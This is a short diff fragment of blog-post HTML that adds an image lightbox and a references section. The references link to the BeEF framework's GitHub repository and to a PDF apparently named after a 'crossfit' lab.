+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020120208.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></li>
 <li><a href="https://anonymousfiles.io/f/crossfit-ByNav1n.pdf" target="_blank" rel="noopener">https://anonymousfiles.io/f/crossfit-ByNav1n.pdf</a></li>
